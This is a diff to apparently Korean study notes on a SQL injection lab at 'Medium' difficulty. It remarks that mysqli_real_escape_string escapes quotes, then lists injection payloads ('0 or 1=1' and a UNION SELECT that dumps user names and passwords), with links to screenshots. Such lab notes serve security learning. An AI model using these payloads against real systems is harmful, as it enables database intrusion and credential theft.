@@ -103,6 +103,48 @@ sudo systemctl restart httpd
 
 
 
+**Medium
+
+```php
+mysqli_real_escape_string 
+// 사용자 입력 값 중 ', \' 등 특수 문자 중 일부 값만 제한
+// \ -> \; -> \\'
+```
+
+다시 공격.
+```mysql
+0 or 1=1
+```
+
+![](../Images/Pasted%20image%2020260730151807.png)
+
+```mysql
+0 UNION SELECT user, password FROM users
+```
+
+![](../Images/Pasted%20image%2020260730152358.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ---
 
